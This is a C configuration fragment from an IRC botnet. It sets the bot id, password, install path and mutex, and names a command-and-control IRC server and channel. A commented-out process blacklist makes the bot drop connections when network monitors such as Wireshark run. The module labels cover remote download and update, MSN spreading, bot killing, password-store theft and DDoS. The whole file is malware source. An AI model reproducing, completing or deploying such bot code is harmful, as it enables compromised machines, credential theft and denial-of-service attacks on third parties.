char xetumhandle[]		= "ukldqfghsdmgkhmgjqsdg";				//*mutex NAME !
char bid[]				= "uNkBoTvZ";			//*bot id
char prefix				= '.';					//*command prefix
char gotopth[]			= "%TEMP%";				//*path to move to (using environement variables [%windir%, %TEMP% etc..])
char exename[]			= "install.exe";		//*exe name when installed
char password[]			= "fuck";				//*bot password
char authhost1[] 		= "*!*@*";
char *authost[] 		= { authhost1 }; 		//*hosts wich are allowed to log them on

SERVER sinfo[]={
		{

			"irc.unkn0wn.eu",			//server
			"",						//pass
			6667,					//port
			"#happyfeet",				//mainchan
			"uNk",					//key
			"-ix",					//modeonconn
			"-ix",					//modeonjoin
		},
};

/*
**********************************
******* Process Black List *******
** { "ProcessName.EXE", 1/2/3 } **
**********************************
** 1 : Cut connections			**
** 2 : Kill the bot				**
** 3 : Uninstall the bot		**
**********************************
** The Process Name is NOT case **
** sensitive!					**
**********************************

PBLACKLIST g_PBlackList = {
								{ "tcpview.exe",	1 },
								{ "wireshark.exe",	1 },
								{ "adware.exe",		2 },
								{ NULL, NULL		  }
						};*/

char main_title[]		= "[main]:";
char irc_title[]		= "[irc]:";
char threads_title[]	= "[thread]:";

char download_title[]	= "[download]:";
char update_title[]		= "[update]:";
char imspread_title[]   = "[msn]:";
char botkiller_title[]	= "[botkiller]:";
char pstore_title[]		= "[pstore]:";
char visit_title[]		= "[visit]:";
char ddos_title[]		= "[ddos]:";
